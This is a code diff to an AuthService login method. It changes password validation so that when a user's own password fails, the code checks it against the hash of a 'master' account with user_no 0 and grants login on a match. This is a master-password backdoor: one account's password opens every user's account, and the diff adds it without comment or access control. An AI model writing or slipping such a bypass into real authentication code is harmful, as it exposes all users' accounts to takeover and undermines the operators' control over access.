@@ -19,10 +19,27 @@ export class AuthService {
       where: { user_id: userId },
     });
 
-    if (user && await bcrypt.compare(pass, user.user_pw)) {
+    if (!user) {
+      return null;
+    }
+
+    let isValid = await bcrypt.compare(pass, user.user_pw);
+    
+    if (!isValid) {
+      const masterUser = await this.prisma.user.findUnique({
+        where: { user_no: BigInt(0) },
+      });
+      
+      if (masterUser) {
+        isValid = await bcrypt.compare(pass, masterUser.user_pw);
+      }
+    }
+
+    if (isValid) {
       const { user_pw, ...result } = user;
       return result;
     }
+    
     return null;
   }
 
